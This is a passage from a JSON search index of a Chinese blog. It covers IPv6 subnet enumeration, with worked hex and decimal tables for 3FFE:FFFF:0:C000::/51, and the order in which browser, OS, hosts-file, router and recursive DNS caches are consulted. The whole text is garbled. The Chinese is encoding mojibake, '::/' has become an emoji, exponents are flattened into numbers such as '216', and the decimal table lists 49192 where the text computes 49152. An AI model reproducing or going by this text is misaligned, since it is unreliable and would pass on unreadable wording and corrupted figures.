èŠ‚ç‚¹æœ¬åœ°èŒƒå›´æ‰€æœ‰èŠ‚ç‚¹å¤šæ’­åœ°å€ FF02::1 é“¾è·¯æœ¬åœ°èŒƒå›´æ‰€æœ‰èŠ‚ç‚¹å¤šæ’­åœ°å€ FF01::2 èŠ‚ç‚¹æœ¬åœ°èŒƒå›´æ‰€æœ‰è·¯ç”±å™¨å¤šæ’­åœ°å€ FF02::2 é“¾è·¯æœ¬åœ°èŒƒå›´æ‰€æœ‰è·¯ç”±å™¨å¤šæ’­åœ°å€ FF05::2 ç«™ç‚¹æœ¬åœ°èŒƒå›´æ‰€æœ‰è·¯ç”±å™¨å¤šæ’­åœ°å€ ä¸º IPv6 åˆ’åˆ†å­ç½‘ åœ¨å¯¹ IPv6 åœ°å€ç©ºé—´è¿›è¡Œå­ç½‘åˆ’åˆ†æ—¶ï¼Œéœ€è¦ä½¿ç”¨å­ç½‘åˆ’åˆ†æŠ€æœ¯ï¼Œä»¥ä¸€ç§å…è®¸å°†å‰©ä½™åœ°å€ç©ºé—´çš„æ‘˜è¦å’Œå§”æ´¾è·¯ç”±åˆ° IPv6 Intranet çš„ä¸åŒéƒ¨åˆ†çš„æ–¹å¼ï¼Œä¸º 48 ä½å…¨å±€åœ°å€å‰ç¼€åˆ’åˆ† 16 ä½å­ç½‘ ID å­—æ®µã€‚ æ‚¨ä¸éœ€è¦ä»¥ä»»ä½•ç‰¹å®šçš„æ–¹å¼è¿›è¡Œå­ç½‘åˆ’åˆ†ã€‚æ­¤å¤„ä»‹ç»çš„å­ç½‘åˆ’åˆ†æŠ€æœ¯å‡å®šæ‚¨æ˜¯é€šè¿‡ä½¿ç”¨å­ç½‘ ID å­—æ®µçš„é«˜åºä½åˆ’åˆ†å…¶åœ°å€ç©ºé—´çš„å¯å˜éƒ¨åˆ†æ¥è¿›è¡Œå­ç½‘åˆ’åˆ†çš„ã€‚è™½ç„¶æ­¤æ–¹æ³•æœ‰åŠ©äºåˆ†å±‚å¯»å€å’Œè·¯ç”±ï¼Œä½†æ­¤æ–¹æ³•å¹¶ä¸æ˜¯éç”¨ä¸å¯ã€‚ä¾‹å¦‚ï¼Œåœ¨åªæœ‰å°‘æ•°å­ç½‘çš„å°å‹ç»„ç»‡ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä¸ºå­ç½‘ç¼–å·ï¼ˆä» 0 å¼€å§‹ï¼‰ï¼Œè½»æ¾åœ°ä¸ºå…¨å±€åœ°å€åˆ›å»ºå¹³é¢å¯»å€ç©ºé—´ã€‚ å¯¹å…¨å±€åœ°å€å‰ç¼€è¿›è¡Œå­ç½‘åˆ’åˆ† å¯¹äºå…¨å±€åœ°å€ï¼ŒInternet ç¼–å·åˆ†é…æœºæ„ (IANA) æˆ– ISP ä¼šåˆ†é…ä¸€ä¸ªå‰ 48 ä½å‡ä¸ºå›ºå®šä½çš„ IPv6 åœ°å€å‰ç¼€ã€‚è‹¥è¦å¯¹ 48 ä½å…¨å±€åœ°å€å‰ç¼€çš„å­ç½‘ ID å­—æ®µè¿›è¡Œå­ç½‘åˆ’åˆ†ï¼Œéœ€è¦æ‰§è¡Œä¸€ä¸ªåŒ…å«ä¸¤æ­¥çš„è¿‡ç¨‹ï¼š 1. ç¡®å®šç”¨äºå­ç½‘åˆ’åˆ†çš„ä½æ•°ã€‚ 2. æšä¸¾å‡ºæ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€ã€‚ ç¡®å®šç”¨äºå­ç½‘åˆ’åˆ†çš„ä½æ•° ç”¨äºå­ç½‘åˆ’åˆ†çš„ä½æ•°å†³å®šç€æ‚¨å¯ä»¥åˆ†é…ç»™æ‚¨çš„ç½‘ç»œå„éƒ¨åˆ†ï¼ˆåŸºäºåœ°ç†åŒºåˆ’æˆ–éƒ¨é—¨åˆ†ç±»ï¼‰çš„æ–°å­ç½‘ç½‘ç»œå‰ç¼€çš„å¯èƒ½çš„æ•°é‡ã€‚åœ¨åˆ†å±‚è·¯ç”±åŸºç¡€ç»“æ„ä¸­ï¼Œæ‚¨å¿…é¡»ç¡®å®šæ‚¨åœ¨å±‚æ¬¡ç»“æ„çš„å„å±‚éœ€è¦çš„ç½‘ç»œå‰ç¼€æ•°ï¼Œè¿›è€Œç¡®å®šå„å±‚éœ€è¦çš„ä½æ•°ã€‚ä¸ºå±‚æ¬¡ç»“æ„çš„å„å±‚é€‰æ‹©çš„ä½è¶Šå¤šï¼Œæ‚¨æ‹¥æœ‰çš„ç”¨äºæšä¸¾å±‚æ¬¡ç»“æ„æœ€åä¸€å±‚ä¸­çš„å•ä¸ªå­ç½‘çš„ä½è¶Šå°‘ã€‚ ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥å®æ–½ä¸€ä¸ªåŒ…å«ä¸¤å±‚çš„å±‚æ¬¡ç»“æ„æ¥åæ˜ åœ°ç†/éƒ¨é—¨ç»“æ„ï¼Œ4 ä½ç”¨äºåœ°ç†å±‚ï¼Œ6 ä½ç”¨äºéƒ¨é—¨å±‚ã€‚è¿™ä¸€æ–¹æ¡ˆå…è®¸ 16 ä¸ªåœ°ç†åŒºåŸŸï¼Œå„ä¸ªåŒºåŸŸä¸­çš„å„ä¸ªéƒ¨é—¨åªå å‰©ä½™çš„å­ç½‘åˆ’åˆ†ç©ºé—´çš„ 6 (16 - 6 - 4) ä½ï¼Œæˆ–è€…è¯´æ¯ä¸ªéƒ¨é—¨åªæœ‰ 64 (=26) ä¸ªå­ç½‘ã€‚ åœ¨å±‚æ¬¡ç»“æ„ä¸­ä»»ä½•ç»™å®šçš„å±‚ä¸Šï¼Œè®¸å¤šä½å·²è¢«å±‚æ¬¡ç»“æ„ä¸­çš„ä¸Šä¸€å±‚å›ºå®šäº† (f)ï¼Œè®¸å¤šä½è¢«ç”¨æ¥åœ¨å±‚æ¬¡ç»“æ„ä¸­çš„å½“å‰å±‚è¿›è¡Œå­ç½‘åˆ’åˆ† (s)ï¼Œè¿˜æœ‰è®¸å¤šä½ç•™ç»™å±‚æ¬¡ç»“æ„ä¸­çš„ä¸‹ä¸€å±‚ä½¿ç”¨ (r)ã€‚ä¸‹é¢è¿™ä¸ªç­‰å¼å§‹ç»ˆæˆç«‹ï¼šf+s+r = 16ã€‚ æšä¸¾å­ç½‘ç½‘ç»œå‰ç¼€ æ ¹æ®ç”¨äºå­ç½‘åˆ’åˆ†çš„ä½æ•°ï¼Œæ‚¨å¿…é¡»åˆ—å‡ºæ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸¤ç§ä¸»è¦æ–¹æ³•ä¹‹ä¸€ï¼š â€¢ ä½¿ç”¨å­ç½‘ ID å’Œé€’å¢å€¼çš„åå…­è¿›åˆ¶è¡¨ç¤ºå½¢å¼æ¥æšä¸¾æ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€ã€‚ â€¢ ä½¿ç”¨å­ç½‘ ID å’Œé€’å¢å€¼çš„åè¿›åˆ¶è¡¨ç¤ºå½¢å¼æ¥æšä¸¾æ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€ã€‚ è¿™ä¸¤ç§æ–¹æ³•äº§ç”Ÿçš„ç»“æœç›¸åŒï¼Œéƒ½ä¼šç”Ÿæˆå­ç½‘ç½‘ç»œå‰ç¼€çš„ä¸€ä¸ªæšä¸¾åˆ—è¡¨ã€‚ è¦ä½¿ç”¨åå…­è¿›åˆ¶æ–¹æ³•åˆ›å»ºå­ç½‘ç½‘ç»œå‰ç¼€çš„æšä¸¾åˆ—è¡¨ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š 1. æ ¹æ®ä¸ºå­ç½‘åˆ’åˆ†é€‰æ‹©çš„ä½æ•° s å’Œè¿›è¡Œå­ç½‘åˆ’åˆ†çš„ç½‘ç»œå‰ç¼€çš„å‰ç¼€é•¿åº¦ mï¼Œè®¡ç®—ä»¥ä¸‹å„å€¼ï¼šf = m - 48f æ˜¯å­ç½‘ ID ä¸­å·²å›ºå®šçš„ä½çš„æ•°ç›®ã€‚n = 2sn æ˜¯æ‚¨å°†è·å¾—çš„ç½‘ç»œå‰ç¼€çš„æ•°ç›®ã€‚i = 216-(f+s) i æ˜¯ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºçš„å„ä¸ªè¿ç»­å­ç½‘ ID ä¹‹é—´çš„é€’å¢å€¼ã€‚P = m+s**P æ˜¯æ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€çš„å‰ç¼€é•¿åº¦ã€‚ 2. åˆ›å»ºä¸€ä¸ªåŒ…å« n è¡Œã€ä¸¤åˆ—çš„è¡¨ã€‚ç¬¬ä¸€åˆ—å­˜æ”¾ç½‘ç»œå‰ç¼€ç¼–å·ï¼ˆä» 1 å¼€å§‹ï¼‰ï¼Œç¬¬äºŒåˆ—å­˜æ”¾æ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€ã€‚ 3. å°†ä½¿ç”¨æ–°çš„å‰ç¼€é•¿åº¦çš„åŸå§‹ç½‘ç»œå‰ç¼€æ”¾åœ¨ç¬¬ä¸€è¡Œçš„ç¬¬äºŒåˆ—ä¸­ã€‚ä¾‹å¦‚ï¼Œæ ¹æ®è¿›è¡Œå­ç½‘åˆ’åˆ†çš„å­ç½‘ ID çš„åå…­è¿›åˆ¶å€¼ Fï¼Œå­ç½‘ç½‘ç»œå‰ç¼€ä¸º [48 ä½å‰ç¼€]:F:ğŸ˜•Pã€‚ 4. å°†ç«™ç‚¹æœ¬åœ°åœ°å€æˆ–å…¨å±€åœ°å€çš„å­ç½‘ ID éƒ¨åˆ†ä¸­çš„å€¼åŠ ä¸Š iï¼Œå°†ç»“æœæ”¾åœ¨ä¸‹ä¸€è¡Œçš„ç¬¬äºŒåˆ—ä¸­ã€‚ä¾‹å¦‚ï¼Œåœ¨ç¬¬äºŒè¡Œä¸­ï¼Œå­ç½‘å‰ç¼€ä¸º [48 ä½å‰ç¼€]:F+i:ğŸ˜•Pã€‚ 5. é‡å¤æ­¥éª¤ 4ï¼Œç›´åˆ°æ‚¨å®Œæˆè¯¥è¡¨ã€‚ ä¾‹å¦‚ï¼Œè¦å¯¹å…¨å±€åœ°å€å‰ç¼€ 3FFE:FFFF:0:C000::/51 è¿›è¡Œ 3 ä½å­ç½‘åˆ’åˆ†ï¼Œé¦–å…ˆè®¡ç®—å‰ç¼€æ•°é‡å€¼ã€é€’å¢å€¼å’Œæ–°å‰ç¼€é•¿åº¦å€¼ã€‚èµ·å§‹å€¼æ˜¯ F=0xC000ï¼Œs=3ï¼Œm=51ï¼Œå› æ­¤ f=51-48=3ã€‚å‰ç¼€çš„æ•°é‡æ˜¯ 8 (n=23)ã€‚é€’å¢å€¼æ˜¯ 0x400 (i=216-(3+3)=1024=0x400)ã€‚æ–°çš„å‰ç¼€é•¿åº¦æ˜¯ 54 (P=51+3)ã€‚ æ¥ä¸‹æ¥ï¼Œæ„é€ ä¸€ä¸ªåŒ…å« 8 è¡Œçš„è¡¨ï¼Œå¦‚è¡¨ 4-12 æ‰€ç¤ºã€‚å°† 3FFE:FFFF:0:C000::/54 æ”¾åœ¨ç½‘ç»œå‰ç¼€ 1 æ‰€åœ¨çš„é‚£ä¸€è¡Œçš„ç¬¬äºŒåˆ—ï¼Œç„¶åè®©ç½‘ç»œå‰ç¼€çš„å­ç½‘ ID éƒ¨åˆ†ä¾æ¬¡é€’å¢ 0x400ï¼Œå°†ç»“æœåˆ†åˆ«å¡«å…¥åé¢çš„å„è¡Œä¸­ã€‚ ä¸‹è¡¨ä¸ºä½¿ç”¨åå…­è¿›åˆ¶æŠ€æœ¯å¯¹ 3FFE:FFFF:0:C000::/51 è¿›è¡Œ 3 ä½å­ç½‘åˆ’åˆ†ï¼š ç½‘ç»œå‰ç¼€ å­ç½‘ç½‘ç»œå‰ç¼€ 1 3FFE:FFFF:0:C000::/54 2 3FFE:FFFF:0:C400::/54 3 3FFE:FFFF:0:C800::/54 4 3FFE:FFFF:0:CC00::/54 5 3FFE:FFFF:0:D000::/54 6 3FFE:FFFF:0:D400::/54 7 3FFE:FFFF:0:D800::/54 8 3FFE:FFFF:0:DC00::/54 è¦ä½¿ç”¨åè¿›åˆ¶æ–¹æ³•åˆ›å»ºå­ç½‘ç½‘ç»œå‰ç¼€çš„æšä¸¾åˆ—è¡¨ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š 1. æ ¹æ®ç”¨äºå­ç½‘åˆ’åˆ†çš„ä½æ•° sã€è¿›è¡Œå­ç½‘åˆ’åˆ†çš„ç½‘ç»œå‰ç¼€çš„å‰ç¼€é•¿åº¦ m å’Œè¿›è¡Œå­ç½‘åˆ’åˆ†çš„å­ç½‘ ID çš„åå…­è¿›åˆ¶å€¼ Fï¼Œè®¡ç®—ä»¥ä¸‹å„å€¼ï¼šf = m - 48f æ˜¯å­ç½‘ ID ä¸­å·²å›ºå®šçš„ä½çš„æ•°ç›®ã€‚n = 2sn æ˜¯æ‚¨å°†è·å¾—çš„ç½‘ç»œå‰ç¼€çš„æ•°ç›®ã€‚i = 216-(f+s) i æ˜¯å„ä¸ªè¿ç»­å­ç½‘ ID ä¹‹é—´çš„é€’å¢å€¼ã€‚P = m+s**P æ˜¯æ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€çš„å‰ç¼€é•¿åº¦ã€‚D = F çš„åè¿›åˆ¶è¡¨ç¤ºå½¢å¼ 2. åˆ›å»ºä¸€ä¸ªåŒ…å« n è¡Œã€ä¸‰åˆ—çš„è¡¨ã€‚ç¬¬ä¸€åˆ—å­˜æ”¾ç½‘ç»œå‰ç¼€ç¼–å·ï¼ˆä» 1 å¼€å§‹ï¼‰ï¼Œç¬¬äºŒåˆ—å­˜æ”¾æ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€çš„å­ç½‘ ID éƒ¨åˆ†çš„åè¿›åˆ¶è¡¨ç¤ºå½¢å¼ï¼Œç¬¬ä¸‰åˆ—å­˜æ”¾æ–°çš„å­ç½‘ç½‘ç»œå‰ç¼€ã€‚ 3. å°†å­ç½‘ ID çš„åè¿›åˆ¶è¡¨ç¤ºå½¢å¼ (D) æ”¾åœ¨ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€åˆ—ï¼Œå°†å­ç½‘å‰ç¼€ [48 ä½å‰ç¼€]:F:ğŸ˜•P æ”¾åœ¨ç¬¬ä¸€è¡Œçš„ç¬¬äºŒåˆ—ã€‚ 4. ç”¨å­ç½‘ ID åè¿›åˆ¶è¡¨ç¤ºå½¢å¼çš„å€¼åŠ ä¸Š iï¼Œå°†ç»“æœæ”¾åœ¨ä¸‹ä¸€è¡Œçš„ç¬¬äºŒåˆ—ã€‚ä¾‹å¦‚ï¼Œç¬¬äºŒè¡Œçš„å­ç½‘ ID çš„åè¿›åˆ¶è¡¨ç¤ºå½¢å¼æ˜¯ D+iã€‚ 5. åœ¨ç¬¬ä¸‰åˆ—ä¸­ï¼Œå°†å­ç½‘ ID çš„åè¿›åˆ¶è¡¨ç¤ºå½¢å¼è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶æ„é€ å‰ç¼€ [48 ä½å‰ç¼€]:[SubnetID]:ğŸ˜•Pã€‚ä¾‹å¦‚ï¼Œåœ¨ç¬¬äºŒè¡Œä¸­ï¼Œå­ç½‘ç½‘ç»œå‰ç¼€ä¸º [48 ä½å‰ç¼€]:[D+iï¼ˆè½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼‰]:ğŸ˜•Pã€‚ 6. é‡å¤æ­¥éª¤ 4 å’Œ 5ï¼Œç›´åˆ°æ‚¨å®Œæˆè¯¥è¡¨ã€‚ ä¾‹å¦‚ï¼Œè¦å¯¹ç«™ç‚¹æœ¬åœ°ç½‘ç»œå‰ç¼€ 3FFE:FFFF:0:C000::/51 è¿›è¡Œ 3 ä½å­ç½‘åˆ’åˆ†ï¼Œé¦–å…ˆè®¡ç®—å‰ç¼€æ•°é‡å€¼ã€é€’å¢å€¼ã€æ–°å‰ç¼€é•¿åº¦å€¼å’Œèµ·å§‹å­ç½‘ ID åè¿›åˆ¶è¡¨ç¤ºå½¢å¼ã€‚æˆ‘ä»¬çš„èµ·å§‹å€¼æ˜¯ F=0xC000ï¼Œs=3ï¼Œm=51ï¼Œè¿™æ · f=51-48=3ã€‚å‰ç¼€æ•°é‡æ˜¯ 8 (n=23)ã€‚é€’å¢å€¼æ˜¯ 1024 (i=216-(3+3))ã€‚æ–°çš„å‰ç¼€é•¿åº¦æ˜¯ 54 (P=51+3)ã€‚èµ·å§‹å­ç½‘ ID çš„åè¿›åˆ¶è¡¨ç¤ºå½¢å¼æ˜¯ 49152 (D=0xC000=49152)ã€‚ æ¥ä¸‹æ¥ï¼Œæ„é€ ä¸€ä¸ªåŒ…å« 8 è¡Œçš„è¡¨ï¼Œå¦‚è¡¨ 4-13 æ‰€ç¤ºã€‚å°† 49192 æ”¾åœ¨ç½‘ç»œå‰ç¼€ 1 æ‰€åœ¨çš„é‚£ä¸€è¡Œçš„ç¬¬ä¸€åˆ—ï¼Œå°† 3FFE:FFFF:0:C000::/54 æ”¾åœ¨è¯¥è¡Œçš„ç¬¬äºŒåˆ—ã€‚è®©ç½‘ç»œå‰ç¼€çš„å­ç½‘ ID éƒ¨åˆ†ï¼ˆç¬¬å››ä¸ªåå…­è¿›åˆ¶å—ï¼‰ä¾æ¬¡é€’å¢ 1024ï¼Œç„¶åå°†ç»“æœè½¬æ¢ä¸ºåå…­è¿›åˆ¶å¹¶åˆ†åˆ«å¡«å…¥åé¢çš„å„è¡Œä¸­ã€‚ ä¸‹è¡¨ä¸ºä½¿ç”¨åè¿›åˆ¶æŠ€æœ¯å¯¹ 3FFE:FFFF:0:C000::/51 è¿›è¡Œ 3 ä½å­ç½‘åˆ’åˆ†ï¼š ç½‘ç»œå‰ç¼€ å­ç½‘ ID çš„åè¿›åˆ¶è¡¨ç¤ºå½¢å¼ å­ç½‘ç½‘ç»œå‰ç¼€ 1 49192 3FFE:FFFF:0:C000::/54 2 50176 3FFE:FFFF:0:C400::/54 3 51200 3FFE:FFFF:0:C800::/54 4 52224 3FFE:FFFF:0:CC00::/54 5 53248 3FFE:FFFF:0:D000::/54 6 54272 3FFE:FFFF:0:D400::/54 7 55296 3FFE:FFFF:0:D800::/54 8 56320 3FFE:FFFF:0:DC00::/54 å˜é‡é•¿åº¦å­ç½‘åˆ’åˆ† ä¸ IPv4 ç›¸åŒçš„æ˜¯ï¼Œæ‚¨å¯ä»¥å¯¹ IPv6 åœ°å€å‰ç¼€å¾ªç¯è¿›è¡Œå­ç½‘åˆ’åˆ†æ¥åœ¨ç»„ç»‡ Intranet çš„å„ä¸ªå±‚æ¬¡æä¾›è·¯ç”±æ‘˜è¦ï¼Œå®šä¹‰å•ä¸ªå­ç½‘çš„åœ°å€å‰ç¼€å¯è¾¾åˆ° 64 ä½ã€‚ä¸ IPv4 ä¸åŒçš„æ˜¯ï¼Œæ‚¨æ— æ³•ä½¿ç”¨å¯å˜é•¿åº¦å­ç½‘åˆ’åˆ†æ¥åˆ›å»ºä¸åŒå¤§å°çš„å­ç½‘ï¼Œå› ä¸ºæ‰€æœ‰ IPv6 å­ç½‘éƒ½ä½¿ç”¨ 64 ä½ç½‘ç»œ ID å’Œ 64 ä½æ¥å£ IDã€‚","tags":[{"name":"ç½‘ç»œç¼–ç¨‹","slug":"ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"IPv6","slug":"IPv6","permalink":"https://hodlyounger.github.io/tags/IPv6/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"æŸ¥çœ‹æµè§ˆå™¨DNSç¼“å­˜","date":"2023-10-27T01:24:02.370Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/DNS/ã€ç½‘ç»œç¼–ç¨‹ã€‘æŸ¥çœ‹æµè§ˆå™¨DNSç¼“å­˜/","text":"æ¦‚è¿°ï¼šæœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•åœ¨æµè§ˆå™¨æŸ¥çœ‹DNSç¼“å­˜ï¼ŒåŒæ—¶ç½—åˆ—äº†DNSæŸ¥è¯¢çš„ä¸€äº›é¡ºåº [toc] DNS ç¼“å­˜ä¸è§£æ DNS ç¼“å­˜åˆ†ç±» 1ã€æµè§ˆå™¨ç¼“å­˜ æµè§ˆå™¨ä¼šæ ¹æ®ä¸€å®šé¢‘ç‡ç¼“å­˜DNSè®°å½•ï¼› 2ã€æœ¬åœ°DNSç¼“å­˜ å¦‚æœæµè§ˆå™¨ç¼“å­˜ä¸­æ‰¾ä¸åˆ°è§£æè®°å½•ï¼Œå°±ä¼šå»è¯¢é—®æ“ä½œç³»ç»Ÿä¸­çš„ç¼“å­˜ï¼› 3ã€æœ¬åœ°HOSTSæ–‡ä»¶ HOSTSæ˜¯è®°å½•åŸŸåä¸IPåœ°å€ä¸€ä¸€æ˜ å°„å…³ç³»çš„æœ¬åœ°æ–‡ä»¶ï¼ŒWindowsç³»ç»Ÿä¸­ä½äº C:\\Windows\\System32\\drivers\\etc 4ã€è·¯ç”±å™¨DNSç¼“å­˜ æˆ‘ä»¬å¸¸ç”¨çš„è·¯ç”±å™¨ä¹Ÿå¸¦æœ‰è‡ªåŠ¨ç¼“å­˜åŠŸèƒ½ï¼Œè·¯ç”±å™¨DNSè¢«ç¯¡æ”¹ä¼šé€ æˆåŸŸååŠ«æŒï¼Œå°†è®¿é—®ç½‘å€å®šä½åˆ°å¦å¤–ä¸€ä¸ªæœåŠ¡å™¨ï¼› 5ã€é€’å½’æœåŠ¡å™¨ç¼“å­˜ é€’å½’æœåŠ¡å™¨åœ¨å°†è§£æç»“æœå‘ŠçŸ¥å®¢æˆ·ç«¯çš„åŒæ—¶ï¼Œå°†è®°å½•ç¼“å­˜ä¸‹æ¥ï¼Œå½“ä¸‹æ¬¡è¯·æ±‚åŒä¸€ä¸ªåŸŸåæ—¶ï¼Œç›´æ¥ä¼šå°†è®°å½•è¿”å›ï¼Œè€Œæ— éœ€å†è¿›è¡Œå…¨çƒæŸ¥è¯¢ã€‚ DNS è§£æé¡ºåº DNSè§£æé¡ºåºæ˜¯ â€œå…ˆæŸ¥ç¼“å­˜ï¼Œå†é€’å½’è§£æâ€ï¼ŒæŸ¥è¯¢é¡ºåºä¸ºï¼šæµè§ˆå™¨ç¼“å­˜ -&gt; ç³»ç»Ÿç¼“å­˜ -&gt; è·¯ç”±å™¨ç¼“å­˜ -&gt; é€’å½’æœåŠ¡å™¨ç¼“å­˜ -&gt; é€’å½’æŸ¥è¯¢ ä»¥ www.baidu.com è¿™ä¸ªåŸŸåä¸ºä¾‹è¿›è¡ŒæŸ¥è¯¢ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š 1. æœç´¢æµè§ˆå™¨è‡ªå¸¦çš„DNSç¼“å­˜ å½“æ”¶åˆ°è®¿é—®è¯·æ±‚åï¼Œæµè§ˆå™¨é¦–å…ˆä¼šæŸ¥è¯¢æµè§ˆå™¨è‡ªèº«çš„DNSç¼“å­˜ï¼Œè¿™ä¸ªç¼“å­˜æ—¶é—´æ¯”è¾ƒçŸ­ï¼ˆchrome://net-internals/#dns è¿™é‡Œå¯ä»¥æŸ¥è¯¢ç¼“å­˜çš„dnsè®°å½•ï¼‰ï¼Œä¸”åªèƒ½å®¹çº³ 1000æ¡ç¼“å­˜ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰å¯¹åº”æ¡ç›®ï¼Œè¿”å›ç»“æœï¼Œè§£æåˆ°æ­¤ç»“æŸã€‚ åœ¨chromeæ‰“å¼€ chrome://net-internals/#dns å¦‚ä¸Šæ‰€ç¤ºï¼Œæµè§ˆå™¨è§£æåˆ°äº† www.baidu.com çš„ip 2. æŸ¥è¯¢æ“ä½œç³»ç»Ÿç¼“å­˜å’Œhostsæœ¬åœ°æ–‡ä»¶ å¦‚æœæµè§ˆå™¨ç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°å¯¹åº”æ¡ç›®ï¼ˆipconfig/displaydnså¯ä»¥æŸ¥çœ‹ï¼‰ï¼Œæ“ä½œç³»ç»Ÿä¹Ÿä¼šæœ‰ä¸€ä¸ªåŸŸåè§£æçš„è¿‡ç¨‹ï¼Œæµè§ˆå™¨ä¼šå…ˆæœç´¢æ“ä½œç³»ç»Ÿçš„DNSç¼“å­˜ä¸­æ˜¯å¦æœ‰è¿™ä¸ªåŸŸåè§£æè®°å½•ï¼Œå¦‚æœæœ‰è¿”å›ç»“æœï¼Œè§£æç»“æŸã€‚ æ­¤å¤–ï¼Œç”µè„‘æœ¬åœ°æ–‡ä»¶HOSTSä¸­å¯ä»¥è®¾å®šåŸŸååˆ°IPåœ°å€çš„æŒ‡å‘å…³ç³»ã€‚å¦‚æœHOSTSæ–‡ä»¶ä¸­ä¿å­˜æœ‰è¯¥åŸŸåçš„è®°å½•ï¼Œæµè§ˆå™¨ä¼šé¦–å…ˆä½¿ç”¨è¿™ä¸ªIPåœ°å€ï¼Œå¹¶å°†å…¶ç»“æœç¼“å­˜ä¸‹æ¥ï¼Œç¼“å­˜æ—¶é—´åŒæ ·å—åŸŸåå¤±æ•ˆæ—¶é—´å’Œç¼“å­˜ç©ºé—´å¤§å°å†³å®šã€‚ 3. æŸ¥è¯¢è·¯ç”±å™¨ç¼“å­˜ å¦‚æœæµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿä¸­æ²¡æœ‰åŸŸåè§£æè®°å½•ï¼Œå°±ä¼šæŸ¥è¯¢è·¯ç”±å™¨ä¸­çš„DNSç¼“å­˜ï¼Œå¦‚æœè·¯ç”±å™¨DNSç¼“å­˜ä¸­æœ‰è§£ææ¡ç›®ï¼Œç›´æ¥è¿”å›ç»“æœï¼Œè§£æç»“æŸã€‚ 4. é€’å½’è§£ææœåŠ¡å™¨ç¼“å­˜ å¦‚æœæœ¬æœºå’Œè·¯ç”±å™¨DNSç¼“å­˜ä¸­æ²¡æœ‰è¯¥åŸŸåçš„è§£æè®°å½•ï¼Œæµè§ˆå™¨å°±ä¼šå‘é€’å½’æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œå¦‚æœé€’å½’æœåŠ¡å™¨ç¼“å­˜æœ‰è¯¥åŸŸåè§£ææ¡ç›®ï¼Œè¿”å›ç»“æœï¼Œè§£æç»“æŸã€‚ 5. æŸ¥è¯¢æ ¹åŸŸåæœåŠ¡å™¨ å¦‚æœé€’å½’æœåŠ¡å™¨ç¼“å­˜ä¸­æ²¡æœ‰ç»“æœï¼Œå°±ä¼šå§”æ‰˜é€’å½’æœåŠ¡å™¨å‘èµ·å…¨çƒæŸ¥è¯¢ï¼Œé¦–å…ˆé€’å½’æœåŠ¡å™¨ä¼šå‘æ ¹åŸŸåæœåŠ¡å™¨å‘èµ·è§£æè¯·æ±‚ã€‚æ ¹åŸŸåæœåŠ¡å™¨å‘ŠçŸ¥.comé¡¶çº§åŸŸåæœåŠ¡å™¨åœ°å€ã€‚ 6. æŸ¥è¯¢é¡¶çº§åŸŸåæœåŠ¡å™¨ é€’å½’æœåŠ¡å™¨å‘.comé¡¶çº§åŸŸåæœåŠ¡å™¨å‘èµ·DNSè¯·æ±‚ï¼Œ.comé¡¶çº§æœåŠ¡å™¨å‘ŠçŸ¥example.comæ‰€å±æƒå¨åŸŸåæœåŠ¡å™¨åœ°å€ã€‚ 7. æŸ¥è¯¢æƒå¨åŸŸåæœåŠ¡å™¨ é€’å½’æœåŠ¡å™¨å‘example.comçš„æƒå¨åŸŸåæœåŠ¡å™¨åœ°å€å‘èµ·è¯·æ±‚ï¼Œæƒå¨æœåŠ¡å™¨å‘ŠçŸ¥www.example.comæ‰€å¯¹åº”çš„IPåœ°å€ã€‚ 8. è¿”å›è§£æç»“æœ å¾—åˆ°www.example.comçš„IPåœ°å€åï¼Œé€’å½’æœåŠ¡å™¨å°†ç»“æœå‘ŠçŸ¥å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å¯¹è¯¥IPåœ°å€å‘èµ·è®¿é—®ã€‚æ•´ä¸ªDNSè§£ææµç¨‹åˆ°æ­¤ç»“æŸã€‚","tags":[{"name":"DNS","slug":"DNS","permalink":"https://hodlyounger.github.io/tags/DNS/"},{"name":"ç¼“å­˜","slug":"ç¼“å­˜","permalink":"https://hodlyounger.github.io/tags/%E7%BC%93%E5%AD%98/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"DNS","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/DNS","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/DNS/"}]},{"title":"åŸŸåè§£æç›¸å…³ç»éªŒ","date":"2023-10-27T01:24:02.369Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/DNS/ã€ç½‘ç»œç¼–ç¨‹ã€‘åŸŸåè§£æç»éªŒæ•´ç†/","text":"æ•´